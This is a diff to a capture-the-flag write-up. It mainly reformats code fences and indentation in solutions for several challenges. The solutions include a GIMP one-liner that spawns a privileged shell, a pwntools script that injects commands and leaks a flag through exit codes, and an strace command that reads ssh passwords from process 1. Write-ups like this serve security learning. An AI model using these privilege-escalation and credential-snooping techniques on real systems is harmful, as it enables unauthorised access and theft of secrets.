@@ -20,7 +20,7 @@ ssh -p 50027 user@jh2i.com # password is 'userpass'
 
 Google for GTFOBins:
 
-```
+```bash
 $ gimp -idf --batch-interpreter=python-fu-eval -b 'import os; os.execl("/bin/sh", "sh", "-p")'
 (gimp:25615): GLib-GObject-WARNING **: 18:26:38.010: g_object_set_is_valid_property: object class 'GeglConfig' has no property named 'cache-size'
 Failed to parse tag cache: No such file or directory
@@ -48,7 +48,7 @@ nc jh2i.com 50025
 
 Using exit codes to leak info.  Ok, more than 1-2 lines, but still easy, and will never use again:
 
-```
+```python
 #!/usr/bin/python3
 
 from pwn import *
@@ -58,26 +58,26 @@ s = 'cat $(find . -name flag.txt) | grep flag{'
 dots = 0
 
 while True:
-	ss = s + dots * '.'
-	ss += '}'
-	p.sendline(ss)
-	_ = p.recvline().strip()
-	if _[0] == ord('0'):
-		break
-	dots += 1
+    ss = s + dots * '.'
+    ss += '}'
+    p.sendline(ss)
+    _ = p.recvline().strip()
+    if _[0] == ord('0'):
+        break
+    dots += 1
 
 print('flag length',dots)
 letters = '_abcdefghijklmnopqrstuvwxyz-0123456789@ABCDEFGHIJKLMNOPQRSTUVWXYZ.'
 
 for i in range(dots):
-	for j in letters:
-		ss = s + j
-		p.sendline(ss)
-		_ = p.recvline().strip()
-		if _[0] == ord('0'):
-			s += j
-			print('flag',s)
-			break
+    for j in letters:
+        ss = s + j
+        p.sendline(ss)
+        _ = p.recvline().strip()
+        if _[0] == ord('0'):
+            s += j
+            print('flag',s)
+            break
 
 print('flag',s + '}')
 ```
@@ -96,7 +96,7 @@ ssh -p 50029 root@jh2i.com # password is 'root'
 
 Oldskool, Google for _how to read ssh passwords with strace_:
 
-```
+```bash
 # strace -f -p 1 2>&1 | grep read | grep flag
 [pid 24395] read(6, "\10\0\0\0\4flag", 9) = 9
 [pid 24395] read(6, "\f\0\0\0\33flag{okay_so_that_was_cool}", 32) = 32
@@ -119,7 +119,7 @@ I love DTMF.  It is [central to hacker history](https://www.amazon.com/gp/produc
 
 Get a Ubuntu 16.04 container for this:
 
-```
+```bash
 # multimon -a DTMF -t wav flag.wav | grep DTMF: | awk '{print $NF}' | xargs | sed 's/ //g'
 46327402297754110981468069185383422945309689772058551073955248013949155635325
 # python3
@@ -143,7 +143,7 @@ _Groan_
 
 2-liner:
 
-```
+```bash
 GetOldTweets3 --username "BigBird01558595" --maxtweets 1000
 $ zbarimg <(cat output_got.csv | awk -F, '{print $7}' | awk -F\" '{print $2}' | awk -F\# '{print $2}' | sort -n | awk '{print $NF}' | xargs printf "%02x" | xxd -r -p) 2>&1 | grep QR | awk -F: '{print $NF}'
 flag{big_bird_tweets_big_tweets}
